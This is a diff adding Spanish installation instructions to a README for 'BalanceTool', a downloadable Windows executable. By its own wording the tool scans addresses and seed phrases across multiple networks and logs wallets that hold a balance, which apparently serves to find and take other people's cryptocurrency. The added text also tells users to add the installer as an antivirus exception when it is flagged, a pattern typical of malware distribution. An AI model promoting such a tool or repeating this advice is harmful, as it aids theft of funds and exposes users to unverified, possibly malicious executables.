@@ -101,6 +101,71 @@ El ejecutable se encuentra en la sección de Releases o en tu carpeta de instala
 
 ---
 
+Sigue los pasos a continuación para instalar y comenzar a usar la aplicación.
+
+---
+
+## 🚀 Descarga
+
+Puedes descargar la última versión del instalador desde:
+
+🔗 [Descargar BalanceTool ()](https://github.com/TradeAIcode/BalanceTool/releases/tag/Tool-setup-v4)
+
+🔗 [Descargar BalanceTool Installer (.exe)](https://github.com/TradeAIcode/BalanceTool/releases/download/Tool-setup-v4/BalanceTool_installer.exe)
+
+🔗 [Descargar BalanceTool Installer (.zip)](https://github.com/TradeAIcode/BalanceTool/releases/download/Tool-setup-v4/BalanceTool.zip)
+
+---
+puede usar el ejecutable sin instalacion 
+
+
+## 🧰 Requisitos
+
+- ✅ Windows 8 o superior
+- ✅ Conexión a Internet
+- ✅ No se requiere Python ni instalación previa
+
+---
+
+## 🛠 Instalación paso a paso
+
+1. Haz clic en el enlace de descarga arriba ☝️
+2. Ejecuta el archivo `BalanceTool_Installer.exe` descargado.
+3. Sigue las instrucciones del instalador.
+4. Al finalizar, se creará un acceso directo en tu escritorio llamado **BalanceTool**.
+5. Ejecuta la aplicación y explora la pestaña de **Configuración** antes de empezar.
+
+---
+
+## 📂 ¿Dónde se guardan los datos?
+
+El programa crea una carpeta segura en:
+
+```
+Documentos/BalanceTool
+```
+
+Allí se almacenan:
+
+- `config.json` (configuración editable)
+- `wallets_con_saldo.txt` (hallazgos)
+- `wallets.db` (base de datos local)
+
+---
+
+## ❓¿Qué hacer si el antivirus bloquea el instalador?
+
+Este programa puede ser detectado erróneamente como sospechoso por algunos antivirus por ser autoejecutable.  
+Puedes agregarlo como **excepción temporal** o verificar.
+
+---
+
+## ✅ ¡Listo!
+
+Tu instalación está completa. Puedes comenzar a escanear direcciones y frases semilla en múltiples redes.
+
+> Feliz busqueda
+
 ## ✅ Estado de detección (Jotti)
 
 Revisión antivirus:  
